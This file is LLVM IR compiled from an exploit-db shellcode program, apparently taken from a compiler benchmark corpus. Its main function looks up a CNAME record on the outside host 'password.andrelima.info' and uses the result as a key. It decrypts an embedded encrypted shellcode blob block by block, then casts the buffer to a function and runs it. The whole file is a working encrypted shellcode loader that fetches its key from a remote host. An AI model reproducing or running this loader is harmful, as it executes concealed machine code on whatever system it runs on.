; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/linux_x86-64/extr_43956.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/linux_x86-64/extr_43956.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@hostname = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [24 x i8] c"password.andrelima.info\00", align 1
@T_CNAME = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"\0ARetrieved password is: %s\0A\0A\00", align 1
@__const.main.shellcode = private unnamed_addr constant [33 x i8] c"U\9B+:\9Es#\CE\C5{a\DC\97@)\C9\83IY^\E7(\9BFy\B2\8Es\04d\11T\00", align 16
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca [40 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca [4 x [256 x i32]], align 16
  %12 = alloca [16 x i8], align 16
  %13 = alloca [32 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [33 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32 (...)*, align 8
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = load i64, i64* @hostname, align 8
  %20 = call i32 @strcpy(i64 %19, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %21 = load i64, i64* @hostname, align 8
  %22 = inttoptr i64 %21 to i8*
  %23 = load i32, i32* @T_CNAME, align 4
  %24 = call i8* @ngethostbyname(i8* %22, i32 %23)
  store i8* %24, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i8* @strchr(i8* %25, i8 signext 46)
  store i8* %26, i8** %7, align 8
  %27 = load i8*, i8** %7, align 8
  store i8 0, i8* %27, align 1
  %28 = load i8*, i8** %6, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %28)
  %30 = load i8*, i8** %6, align 8
  %31 = call i32 @strlen(i8* %30)
  store i32 %31, i32* %14, align 4
  %32 = bitcast [33 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %32, i8* align 16 getelementptr inbounds ([33 x i8], [33 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 33, i1 false)
  %33 = getelementptr inbounds [33 x i8], [33 x i8]* %15, i64 0, i64 0
  %34 = call i32 @strlen(i8* %33)
  store i32 %34, i32* %16, align 4
  %35 = getelementptr inbounds [33 x i8], [33 x i8]* %15, i64 0, i64 0
  %36 = bitcast i8* %35 to i32 (...)*
  store i32 (...)* %36, i32 (...)** %17, align 8
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 0
  %38 = call i32 @memset(i8* %37, i32 0, i32 32)
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 0
  %40 = load i8*, i8** %6, align 8
  %41 = load i32, i32* %14, align 4
  %42 = call i32 @memcpy(i8* %39, i8* %40, i32 %41)
  %43 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 0
  %44 = getelementptr inbounds [40 x i32], [40 x i32]* %9, i64 0, i64 0
  %45 = call i32 @keySched(i8* %43, i32 128, i32** %8, i32* %44, i32* %10)
  %46 = load i32*, i32** %8, align 8
  %47 = load i32, i32* %10, align 4
  %48 = getelementptr inbounds [4 x [256 x i32]], [4 x [256 x i32]]* %11, i64 0, i64 0
  %49 = bitcast [256 x i32]* %48 to i32**
  %50 = call i32 @fullKey(i32* %46, i32 %47, i32** %49)
  %51 = load i32*, i32** %8, align 8
  %52 = call i32 @free(i32* %51)
  store i32 0, i32* %18, align 4
  br label %53

53:                                               ; preds = %57, %2
  %54 = load i32, i32* %18, align 4
  %55 = load i32, i32* %16, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %77

57:                                               ; preds = %53
  %58 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %59 = load i32, i32* %18, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [33 x i8], [33 x i8]* %15, i64 0, i64 %60
  %62 = call i32 @memcpy(i8* %58, i8* %61, i32 16)
  %63 = getelementptr inbounds [40 x i32], [40 x i32]* %9, i64 0, i64 0
  %64 = getelementptr inbounds [4 x [256 x i32]], [4 x [256 x i32]]* %11, i64 0, i64 0
  %65 = bitcast [256 x i32]* %64 to i32**
  %66 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %67 = call i32 @decrypt(i32* %63, i32** %65, i8* %66)
  %68 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %69 = call i32 @printHex(i8* %68, i32 16)
  %70 = load i32, i32* %18, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [33 x i8], [33 x i8]* %15, i64 0, i64 %71
  %73 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %74 = call i32 @memcpy(i8* %72, i8* %73, i32 16)
  %75 = load i32, i32* %18, align 4
  %76 = add nsw i32 %75, 16
  store i32 %76, i32* %18, align 4
  br label %53

77:                                               ; preds = %53
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %79 = load i32 (...)*, i32 (...)** %17, align 8
  %80 = call i32 (...) %79()
  ret i32 0
}

declare dso_local i32 @strcpy(i64, i8*) #1

declare dso_local i8* @ngethostbyname(i8*, i32) #1

declare dso_local i8* @strchr(i8*, i8 signext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @keySched(i8*, i32, i32**, i32*, i32*) #1

declare dso_local i32 @fullKey(i32*, i32, i32**) #1

declare dso_local i32 @free(i32*) #1

declare dso_local i32 @decrypt(i32*, i32**, i8*) #1

declare dso_local i32 @printHex(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
